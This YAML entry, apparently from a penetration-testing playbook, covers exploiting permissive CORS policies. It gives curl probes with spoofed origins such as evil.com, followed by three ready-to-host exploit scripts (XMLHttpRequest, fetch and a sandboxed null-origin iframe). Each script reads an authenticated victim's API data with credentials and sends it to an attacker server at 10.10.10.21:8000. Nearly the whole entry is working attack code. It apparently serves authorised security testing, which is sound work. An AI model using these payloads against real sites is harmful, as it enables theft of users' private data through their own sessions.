---
description: |
  CORS (Cross-Origin Resource Sharing) misconfiguration — exploit overly permissive CORS policies to steal sensitive data from authenticated users via malicious origins.
command: |
  # Test CORS with arbitrary origin
  curl -H "Origin: https://evil.com" -I http://10.10.10.27/api/users

  # Check response for:
  # Access-Control-Allow-Origin: https://evil.com  (reflects origin = vulnerable)
  # Access-Control-Allow-Credentials: true          (allows cookies = critical)

  # Null origin test
  curl -H "Origin: null" -I http://10.10.10.27/api/users

  # If Access-Control-Allow-Origin: null is returned, exploitable via sandboxed iframe

  # Subdomain wildcard test
  # Test if subdomains are trusted
  curl -H "Origin: https://evil.senshu.sh" -I http://10.10.10.27/api/users
  curl -H "Origin: https://senshu.sh.evil.com" -I http://10.10.10.27/api/users
  curl -H "Origin: https://attackersenshu.sh" -I http://10.10.10.27/api/users

  # Check for wildcard with credentials
  curl -H "Origin: https://evil.com" -I http://10.10.10.27/api/users

  # Dangerous combination:
  # Access-Control-Allow-Origin: *
  # Access-Control-Allow-Credentials: true
  # (browsers block this, but misconfig may still reflect specific origins)

  # Exploit script — steal data from authenticated victim
  <!-- Host on attacker-controlled server -->
  <html>
  <script>
  var req = new XMLHttpRequest();
  req.onload = function() {
    // Exfiltrate response to attacker
    fetch('http://10.10.10.21:8000/steal?data=' + btoa(this.responseText));
  };
  req.open('GET', 'http://10.10.10.27/api/users', true);
  req.withCredentials = true;
  req.send();
  </script>
  </html>

  # Exploit using fetch API
  <script>
  fetch('http://10.10.10.27/api/users', {
    credentials: 'include'
  })
  .then(response => response.json())
  .then(data => {
    // Send stolen data to attacker server
    fetch('http://10.10.10.21:8000/exfil', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
  </script>

  # Null origin exploit via sandboxed iframe
  <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
  <script>
    fetch('http://10.10.10.27/api/users', {credentials: 'include'})
    .then(r => r.text())
    .then(d => fetch('http://10.10.10.21:8000/exfil?d=' + btoa(d)));
  </script>
  "></iframe>
items:
  - No_Creds
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
techniques:
  - CORS_Misconfiguration
references:
  - https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny
  - https://book.hacktricks.wiki/en/pentesting-web/cors-bypass.html
---
